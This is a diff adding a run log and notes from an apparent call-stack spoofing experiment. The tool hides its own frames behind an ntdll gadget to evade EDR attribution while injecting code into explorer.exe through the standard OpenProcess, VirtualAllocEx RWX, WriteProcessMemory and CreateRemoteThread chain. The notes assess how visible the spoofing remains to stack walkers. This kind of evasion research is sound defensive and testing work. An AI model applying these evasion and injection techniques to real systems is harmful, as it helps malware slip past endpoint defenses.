@@ -1,0 +1,40 @@
+================================================================================
+  SCENARIO 2: SINGLE-FRAME SPOOFED INJECTION
+================================================================================
+[DEBUG] Selected gadget[335/512]: 0x00007FFE81EF881C
+
+[INFO] Executing InjectExplorer with spoofed return address
+[INFO] Gadget source: ntdll.dll
+[INFO] Spoofed return: 0x00007FFE81EF881C
+[INFO] Expected: EDR sees ntdll as caller, stack_spoof.exe absent
+
+  [>] Executing concealed function: InjectExplorer
+      Target: explorer.exe -- full injection pattern
+
+  [STACK TRACE] From inside InjectExplorer (user-mode view):
+      [00] InjectExplorer                           + 0x0060 <-- TARGET
+      [01] RtlWnfDllUnloadCallback                  + 0x1DFC
+      [02] main                                     + 0x03B4
+      [03] mainCRTStartup                           + 0x0014
+      [04] BaseThreadInitThunk                      + 0x0040
+      [05] RtlUserThreadStart                       + 0x0044
+  [>] Found explorer.exe PID: 4872
+  [>] OpenProcess handle: 0x0000000000000148
+  [>] VirtualAllocEx RWX at: 0x00000000040C0000
+  [>] WriteProcessMemory: 16 bytes written
+  [>] CreateRemoteThread: TID handle 0x000000000000014C
+
+  [>] Injection complete -- payload executed in explorer.exe
+
+[SUCCESS] Single-frame spoofed injection completed in 37212 ms
+[INFO] Result: 0x00000001
+[DEBUG] Real return address was: 0x00007FF6C040CE04
+
+Notes:
+- CBT (6 frames): gadget RtlWnfDllUnloadCallback+0x1DFC visible at [01].
+  Crucially, main+0x03B4 remains visible at [02] -- SpoofCallStack (ASM)
+  creates a real x29 frame, so the walker continues above it and finds main.
+  Attribution to stack_spoof.exe is NOT fully hidden from CBT.
+- WinDbg k (2 frames + null): SpoofCallStack+0x50 visible, chain breaks at
+  null RetAddr. See windbg-stack-k.txt.
+- Gadget: RtlWnfDllUnloadCallback+0x1DFC = 0x00007FFE81EF881C (ntdll)
